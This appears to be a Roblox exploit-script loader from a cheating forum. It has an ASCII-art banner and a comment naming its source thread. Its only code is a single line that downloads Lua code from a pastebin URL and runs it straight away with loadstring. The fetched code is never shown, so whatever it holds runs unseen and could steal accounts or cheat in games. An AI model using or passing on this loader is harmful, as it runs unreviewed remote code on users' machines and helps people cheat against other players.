--[[ source: https://v3rmillion.net/showthread.php?tid=1020673
    88""Yb  88""Yb  888888 Yb    dP    db     88  88      Yb  dP
    88__dP  88__dP  88__    Yb  dP    dPYb    88  88       YbdP 
    88"""   88"Yb   88""     YbdP    dP__Yb   88  88  .o   dPYb 
    88      88  Yb  888888    YP    dP""""Yb  88  88ood8  dP  Yb  ~02hacks
]]
loadstring(game:HttpGet("https://pastebin.com/raw/x24KgNwj", true))()